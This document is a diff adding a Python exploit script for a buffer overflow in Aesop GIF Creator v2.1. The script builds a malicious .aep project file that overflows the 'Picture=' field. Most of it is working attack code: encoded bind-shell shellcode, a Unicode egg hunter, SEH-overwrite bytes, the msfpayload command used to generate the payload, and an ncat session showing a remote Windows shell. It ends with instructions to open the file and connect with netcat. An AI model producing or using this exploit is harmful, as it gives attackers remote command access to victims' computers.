@@ -1,0 +1,169 @@
+# !/usr/bin/python
+# Exploit Title: Aesop GIF Creator <= v2.1 (.aep) Buffer Overflow Exploit
+# Date: 12/15/2010
+# Author: xsploitedsec
+# URL: http://www.x-sploited.com/
+# Contact: xsploitedsec [at] x-sploited.com
+# Software Link: http://www.yukudr.com/_h84561/aesop_setup.exe
+# Vulnerable version: <= v2.1
+# Tested on: Windows XP SP3 Eng
+# CVE : N/A
+
+#### Software Description:
+# Aesop is a powerful tool that allows you to create animated GIF images (banners, buttons, labels and headings)
+# for your website and even GIF wallpapers for your mobile phone quickly and easily (click to see samples). You
+# can use an antialiased 3D-Text, shapes (rectangles, rounded rectangles, ellipses and polygons) and external
+# pictures for drawing in your GIF.
+# Convenient interface.
+# Unicode support - you can use national characters as Text in your GIF.
+# An excellent antialiasing technique (blurring the edges between color transitions) to draw 3D-Text and shapes: 
+#### Exploit information:
+# Aesop is prone to a buffer overflow when handling a malicious aesop project files. The vulnerability
+# is due to improper bounds checking of the "Picture=" field which can be exploited by malicious people to
+# compromise a users system.
+#### Other information:
+# I attempted to reach out to the vendor about this but after a few short emails it became clear that they
+# had no interest in verifying it/coordinating a fix so here's the exploit.
+#### Notes:
+# I always knew that one day I would end up needing to deal with unicode buffers. After a couple nights of
+# tinkering around this is the end result. P.S. - When all else fails->Fail harder
+#### Shoutz:
+# kAoTiX, Sheep, Tu, edb-team, corelan team, packetstormsecurity and all other security researchers and sites.
+# -> A big thanks goes to corelanc0d3r for shedding some light on the subject of unicode exploits. ;)
+
+import struct
+import sys
+
+about = "\r\n==================================================================\n"
+about +=  " Title: Aesop GIF Creator <= v2.1 (.aep) Buffer Overflow Exploit PoC\n"
+about +=  " Author: xsploitedsec\n URL: http://www.x-sploited.com/\n"
+about +=  " Contact: xsploitedsecurity [at] x-sploited.com\n"
+about +=  "=================================================================="
+print about
+
+# root@bt:~# msfpayload windows/shell_bind_tcp lport=4444 lhost=0.0.0.0 EXITFUNC=seh R
+# | msfencode -e x86/alpha_upper -c 1 -t c -b '\x1a\x19\x0a' > /tmp/aesop.txt
+# [*] x86/alpha_upper succeeded with size 752 (iteration=1)
+#
+# root@bt:~# ncat 10.0.1.16 4444
+# Microsoft Windows XP [Version 5.1.2600]
+# (C) Copyright 1985-2001 Microsoft Corp.
+# C:\>
+
+# Unmolested, ASCII shellcode buried in stack ftw!?
+bindshell = (
+"\xda\xca\xd9\x74\x24\xf4\x58\x50\x59\x49\x49\x49\x43\x43\x43"
+"\x43\x43\x43\x43\x51\x5a\x56\x54\x58\x33\x30\x56\x58\x34\x41"
+"\x50\x30\x41\x33\x48\x48\x30\x41\x30\x30\x41\x42\x41\x41\x42"
+"\x54\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x58\x50"
+"\x38\x41\x43\x4a\x4a\x49\x4b\x4c\x4d\x38\x4b\x39\x43\x30\x43"
+"\x30\x43\x30\x43\x50\x4d\x59\x4d\x35\x50\x31\x4e\x32\x42\x44"
+"\x4c\x4b\x51\x42\x50\x30\x4c\x4b\x46\x32\x44\x4c\x4c\x4b\x50"
+"\x52\x44\x54\x4c\x4b\x44\x32\x47\x58\x44\x4f\x48\x37\x50\x4a"
+"\x47\x56\x50\x31\x4b\x4f\x46\x51\x4f\x30\x4e\x4c\x47\x4c\x45"
+"\x31\x43\x4c\x44\x42\x46\x4c\x47\x50\x4f\x31\x48\x4f\x44\x4d"
+"\x43\x31\x48\x47\x4d\x32\x4c\x30\x50\x52\x51\x47\x4c\x4b\x51"
+"\x42\x42\x30\x4c\x4b\x47\x32\x47\x4c\x43\x31\x48\x50\x4c\x4b"
+"\x47\x30\x44\x38\x4c\x45\x4f\x30\x43\x44\x50\x4a\x43\x31\x48"
+"\x50\x46\x30\x4c\x4b\x51\x58\x44\x58\x4c\x4b\x51\x48\x51\x30"
+"\x43\x31\x4e\x33\x4a\x43\x47\x4c\x47\x39\x4c\x4b\x50\x34\x4c"
+"\x4b\x45\x51\x4e\x36\x46\x51\x4b\x4f\x46\x51\x49\x50\x4e\x4c"
+"\x4f\x31\x48\x4f\x44\x4d\x43\x31\x48\x47\x50\x38\x4b\x50\x42"
+"\x55\x4c\x34\x45\x53\x43\x4d\x4b\x48\x47\x4b\x43\x4d\x51\x34"
+"\x42\x55\x4a\x42\x50\x58\x4c\x4b\x46\x38\x51\x34\x45\x51\x48"
+"\x53\x45\x36\x4c\x4b\x44\x4c\x50\x4b\x4c\x4b\x50\x58\x45\x4c"
+"\x43\x31\x4e\x33\x4c\x4b\x45\x54\x4c\x4b\x45\x51\x48\x50\x4c"
+"\x49\x47\x34\x46\x44\x47\x54\x51\x4b\x51\x4b\x45\x31\x46\x39"
+"\x51\x4a\x50\x51\x4b\x4f\x4b\x50\x51\x48\x51\x4f\x51\x4a\x4c"
+"\x4b\x42\x32\x4a\x4b\x4c\x46\x51\x4d\x43\x58\x47\x43\x46\x52"
+"\x45\x50\x45\x50\x45\x38\x43\x47\x44\x33\x47\x42\x51\x4f\x51"
+"\x44\x43\x58\x50\x4c\x42\x57\x46\x46\x43\x37\x4b\x4f\x49\x45"
+"\x4f\x48\x4a\x30\x43\x31\x43\x30\x45\x50\x51\x39\x49\x54\x51"
+"\x44\x46\x30\x43\x58\x51\x39\x4b\x30\x42\x4b\x43\x30\x4b\x4f"
+"\x4e\x35\x46\x30\x46\x30\x50\x50\x50\x50\x47\x30\x50\x50\x51"
+"\x50\x50\x50\x45\x38\x4a\x4a\x44\x4f\x49\x4f\x4d\x30\x4b\x4f"
+"\x4e\x35\x4b\x39\x48\x47\x46\x51\x49\x4b\x51\x43\x45\x38\x44"
+"\x42\x45\x50\x42\x31\x51\x4c\x4b\x39\x4b\x56\x42\x4a\x44\x50"
+"\x51\x46\x46\x37\x45\x38\x49\x52\x49\x4b\x50\x37\x45\x37\x4b"
+"\x4f\x4e\x35\x46\x33\x51\x47\x43\x58\x48\x37\x4a\x49\x47\x48"
+"\x4b\x4f\x4b\x4f\x4e\x35\x50\x53\x46\x33\x46\x37\x42\x48\x43"
+"\x44\x4a\x4c\x47\x4b\x4d\x31\x4b\x4f\x4e\x35\x50\x57\x4b\x39"
+"\x49\x57\x42\x48\x44\x35\x42\x4e\x50\x4d\x45\x31\x4b\x4f\x49"
+"\x45\x45\x38\x43\x53\x42\x4d\x45\x34\x43\x30\x4c\x49\x4b\x53"
+"\x50\x57\x50\x57\x51\x47\x46\x51\x4a\x56\x43\x5a\x45\x42\x50"
+"\x59\x50\x56\x4d\x32\x4b\x4d\x43\x56\x48\x47\x51\x54\x47\x54"
+"\x47\x4c\x43\x31\x43\x31\x4c\x4d\x51\x54\x51\x34\x44\x50\x4f"
+"\x36\x43\x30\x51\x54\x50\x54\x46\x30\x46\x36\x46\x36\x46\x36"
+"\x51\x56\x50\x56\x50\x4e\x50\x56\x50\x56\x50\x53\x46\x36\x43"
+"\x58\x44\x39\x48\x4c\x47\x4f\x4d\x56\x4b\x4f\x49\x45\x4c\x49"
+"\x4d\x30\x50\x4e\x46\x36\x47\x36\x4b\x4f\x46\x50\x42\x48\x43"
+"\x38\x4b\x37\x45\x4d\x43\x50\x4b\x4f\x48\x55\x4f\x4b\x4b\x4e"
+"\x44\x4e\x46\x52\x4b\x5a\x43\x58\x4e\x46\x4c\x55\x4f\x4d\x4d"
+"\x4d\x4b\x4f\x48\x55\x47\x4c\x45\x56\x43\x4c\x45\x5a\x4b\x30"
+"\x4b\x4b\x4d\x30\x43\x45\x43\x35\x4f\x4b\x47\x37\x45\x43\x43"
+"\x42\x42\x4f\x42\x4a\x43\x30\x51\x43\x4b\x4f\x4e\x35\x45\x5a"
+"\x41\x41"
+);
+
+# unicode encoded, egg="w00t"
+egg_hunter = (
+"PPYAIAIAIAIAQATAXAZAPA3QADAZABARALAYAIAQAIAQAPA5AAAPAZ"
+"1AI1AIAIAJ11AIAIAXA58AAPAZABABQI1AIQIAIQI1111AIAJQI1AY"
+"AZBABABABAB30APB944JBQVE1HJKOLOPB0RBJLBQHHMNNOLM5PZ44J"
+"O7H2WP0P0T4TKZZFOSEZJ6OT5K7KO9WA"
+);
+
+# aesop project file header
+prj_header = (
+"\x5B\x41\x65\x73\x6F\x70\x20\x50\x72\x6F\x6A\x65\x63\x74\x20\x46\x69\x6C"
+"\x65\x20\x76\x2E\x32\x2E\x30\x5D\x0D\x0A\x7B\x50\x69\x63\x74\x75\x72\x65"
+"\x3D"
+);
+
+#hunter tag ="w00tw00t"
+egg = "\x77\x30\x30\x74\x77\x30\x30\x74"; 
+seh_offset = 669;
+
+# Begin payload buffer
+payload = "\x41" * seh_offset;
+# NSEH
+payload += "\x61";                        #popad
+payload += "\x73";                        #nopalign/add byte ptr [ebx],dh
+# SE handler
+payload += "\xB1\x42";                    #unicode compatible p/p/r - Aesop.exe (universal)
+# Prepare/jump->EAX
+payload += "\x73";                        #venetian/add byte ptr [ebx],dh
+payload += "\x55";                        #push ebp
+payload += "\x73";                        #venetian/add byte ptr [ebx],dh
+payload += "\x58";                        #pop eax
+payload += "\x73";                        #venetian/add byte ptr [ebx],dh
+payload += "\x05\x19\x11";                #add eax, 0x19002200h
+payload += "\x73";                        #venetian/add byte ptr [ebx],dh
+payload += "\x2d\x11\x11";                #sub eax, 0x12007200h
+payload += "\x73";                        #venetian/add byte ptr [ebx],dh
+payload += "\x50";                        #push eax
+payload += "\x73";                        #add byte ptr [ebx],dh
+payload += "\xc3";                        #ret
+
+payload += "\x41" * 242;                  #align egghunter with->(ebp+650)
+payload += egg_hunter;
+payload += "\x41" * 1000;                 #give shellcode some breathing room
+
+payload += egg;
+payload += bindshell;
+
+payload += "\x44" * (5000-len(payload)); #junk padding
+# End payload buffer
+
+xsploitme = (prj_header + payload);
+print("\n[*] Creating file->xsploited.aep");
+
+try:
+	out_file = open("xsploited.aep",'w');
+	out_file.write(xsploitme);
+	out_file.close();
+	print("[+] xsploited.aep created successfully");
+	print("[*] 1. Launch the file or open it via Aesop.exe");
+	print("[*] 2. Wait a sec for egghunter and netcat in :)\n[-] Exiting...\r");
+except (IOError):
+	print("[!] Error creating file\n[-] Exiting...\r");
